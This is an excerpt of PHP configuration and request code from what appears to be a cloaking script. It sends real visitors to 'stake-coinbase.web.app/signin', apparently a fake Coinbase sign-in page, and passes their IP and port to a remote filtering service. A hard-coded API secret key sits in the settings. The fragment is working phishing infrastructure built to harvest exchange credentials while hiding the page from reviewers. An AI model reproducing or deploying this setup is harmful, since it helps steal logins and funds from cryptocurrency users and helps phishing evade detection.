...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'stake-coinbase.web.app/signin';//PHP/HTML file or URL offer used for real users
...
$HCSET['API_SECRET_KEY'] = 'v121a1c17fce804a499eb8f375ac61ab0f';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2641943398&js=false&stage='.$HCSET['stage'];
